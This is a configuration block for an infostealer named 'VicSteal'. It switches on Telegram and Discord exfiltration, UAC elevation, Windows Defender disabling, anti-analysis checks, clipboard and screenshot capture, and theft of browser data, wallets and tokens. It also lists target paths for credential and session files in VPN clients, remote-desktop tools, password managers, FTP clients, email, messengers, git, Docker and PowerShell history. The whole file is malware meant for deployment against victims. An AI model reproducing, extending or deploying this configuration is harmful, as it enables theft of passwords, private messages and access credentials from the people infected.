config: dict[str, str] = {
  "logFileName": f"VicSteal-New-Log",
  "UACAdmin": True,
  "antiVM": False,
  "sendToTelegram": True,
  "sendToDiscord": True,
  "telegramBotToken": "",# write your telegram bot token here
  "telegramChatId": "",# write your telegram chat id here
  "discordWebhookUrl": "",# write your discord webhook url here
  "executionDelay": "",
  "antiCIS": True,
  "extractBrowsersData": True,
  "extractWallets": True,
  "extractGameData": True,
  "extractFiles": True,
  "extractSystemInfo": True,
  "extractBrowsersVersion": True,
  "extractTokens": True,
  "networkSteal": True,
  "clipboardSteal": True,
  "defenderDisable": True,
  "checkAnalysis": True,
  "extractProcess": True,
  "screanShot": True,
  "errorMessage": "sorry, something went wrong :(",# 
  "appCollectorEnabled": True,
  "apps": [
    {
      "name": "Cisco AnyConnect VPN",
      "folders": "%PROGRAMDATA%\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Profile",
      "files": [".XML"]
    },
    {
      "name": "OpenVPN",
      "folders": "%USERPROFILE%\\OpenVPN\\config",
      "files": [".OVPN", "CONFIG.JSON"]
    },
    {
      "name": "NordVPN",
      "folders": "%LOCALAPPDATA%\\NordVPN",
      "files": ["USER.CONFIG"]
    },
    {
      "name": "ProtonVPN",
      "folders": "%LOCALAPPDATA%\\ProtonVPN",
      "files": ["USER.CONFIG"]
    },
    {
      "name": "RustDesk",
      "folders": "%APPDATA%\\RustDesk\\config",
      "files": ["*"]
    },
    {
      "name": "TeamViewer",
      "folders": "%APPDATA%\\TeamViewer",
      "files": ["CONNECTIONS.XML", "TEAMVIEWER.INI"]
    },
    {
      "name": "AnyDesk",
      "folders": "%APPDATA%\\AnyDesk",
      "files": [".CONF"]
    },
    {
      "name": "RealVNC",
      "folders": "%APPDATA%\\RealVNC",
      "files": ["*"]
    },
    {
      "name": "TightVNC",
      "folders": "%APPDATA%\\TightVNC",
      "files": ["*"]
    },
    {
      "name": "UltraVNC",
      "folders": "%APPDATA%\\UltraVNC",
      "files": ["*"]
    },
    {
      "name": "Norton_Password_Manager",
      "folders": "%LOCALAPPDATA%\\Norton",
      "files": ["*"]
    },
    {
      "name": "1Password",
      "folders": "%LOCALAPPDATA%\\1Password",
      "files": [".SQLITE"]
    },
    {
      "name": "Bitwarden",
      "folders": "%APPDATA%\\Bitwarden",
      "files": ["DATA.JSON"]
    },
    {
      "name": "NordPass",
      "folders": "%APPDATA%\\NordPass",
      "files": ["NORDPASS.JSON", "NORDPASS.SQLITE"]
    },
    {
      "name": "FileZilla",
      "folders": "%APPDATA%\\FileZilla",
      "files": ["SITEMANAGER.XML", "RECENTSERVERS.XML", "FILEZILLA.XML"]
    },
    {
      "name": "WinSCP",
      "folders": "%APPDATA%\\WinSCP",
      "files": ["WINSCP.INI", "STORED SESSIONS"]
    },
    {
      "name": "Auto FTP Manager",
      "folders": "%LOCALAPPDATA%\\DeskShareData\\AutoFTPManager",
      "files": ["AUTOFTPMANAGERSETTINGS.DB"]
    },
    {
      "name": "FTP Manager Lite",
      "folders": "%LOCALAPPDATA%\\DeskShareData\\FTPManagerLite",
      "files": ["FTPMANAGERLITESETTINGS.DB"]
    },
    {
      "name": "FTPRush",
      "folders": "%APPDATA%\\FTPRush",
      "files": ["RUSHSITE.XML"]
    },
    {
      "name": "SmartFTP",
      "folders": "%APPDATA%\\SmartFTP\\Client2.0\\Favorites",
      "files": ["*"]
    },
    {
      "name": "Cyberduck",
      "folders": "%APPDATA%\\Cyberduck",
      "files": ["BOOKMARKS.PLIST"]
    },
    {
      "name": "Microsoft Outlook",
      "folders": "%LOCALAPPDATA%\\Microsoft\\Outlook",
      "files": [".OST", ".PST"]
    },
    {
      "name": "Thunderbird",
      "folders": "%APPDATA%\\Thunderbird\\Profiles",
      "files": ["LOGINS.JSON", "KEY4.DB"]
    },
    {
      "name": "HeidiSQL",
      "folders": "%APPDATA%\\HeidiSQL",
      "files": ["HEIDISQL_SETTINGS.XML", "SESSIONS.XML"]
    },
    {
      "name": "DBeaver",
      "folders": "%APPDATA%\\DBeaverData\\workspace6\\.metadata\\.config",
      "files": ["*"]
    },
    {
      "name": "Visual Studio Code",
      "folders": "%APPDATA%\\Code\\User",
      "files": ["SETTINGS.JSON", "GLOBALSTORAGE\\STATE.VSCDB"]
    },
    {
      "name": "Git for Windows",
      "folders": "%USERPROFILE%\\.git-credentials",
      "files": [".GIT-CREDENTIALS"]
    },
    {
      "name": "Telegram",
      "folders": "%APPDATA%\\Telegram Desktop\\tdata",
      "files": [".JSON", ".TXT", "KEY_DATAS"]
    },
    {
      "name": "Discord",
      "folders": "%APPDATA%\\discord",
      "files": [".JSON"]
    },
    {
      "name": "Discord Canary",
      "folders": "%APPDATA%\\discordcanary",
      "files": ["*"]
    },
    {
      "name": "Discord PTB",
      "folders": "%APPDATA%\\discordptb",
      "files": ["*"]
    },
    {
      "name": "Skype",
      "folders": "%APPDATA%\\Microsoft\\Skype for Desktop",
      "files": ["*"]
    },
    {
      "name": "Element",
      "folders": "%APPDATA%\\Element",
      "files": ["*"]
    },
    {
      "name": "Signal",
      "folders": "%APPDATA%\\Signal",
      "files": ["*"]
    },
    {
      "name": "Viber",
      "folders": "%APPDATA%\\ViberPC",
      "files": ["*"]
    },
    {
      "name": "Pidgin",
      "folders": "%APPDATA%\\.purple",
      "files": ["*"]
    },
    {
      "name": "WhatsApp",
      "folders": "%LOCALAPPDATA%\\WhatsApp",
      "files": ["*"]
    },
    {
      "name": "Session",
      "folders": "%APPDATA%\\Session",
      "files": ["*"]
    },
    {
      "name": "Wire",
      "folders": "%APPDATA%\\Wire",
      "files": ["*"]
    },
    {
      "name": "Slack",
      "folders": "%APPDATA%\\Slack",
      "files": ["*"]
    },
    {
      "name": "Teams",
      "folders": "%APPDATA%\\Microsoft\\Teams",
      "files": ["*"]
    },
    {
      "name": "ICQ",
      "folders": "%APPDATA%\\ICQ",
      "files": ["*"]
    },
    {
      "name": "Line",
      "folders": "%LOCALAPPDATA%\\LINE",
      "files": ["*"]
    },
    {
      "name": "WeChat",
      "folders": "%APPDATA%\\Tencent\\WeChat",
      "files": ["*"]
    },
    {
      "name": "Docker",
      "folders": "%APPDATA%\\Docker",
      "files": ["LOGIN-INFO.JSON"]
    },
    {
      "name": "PowerShell",
      "folders": "%APPDATA%\\Microsoft\\Windows\\PowerShell",
      "files": ["CONSOLEHOST_HISTORY.TXT"]
    }
  ]
}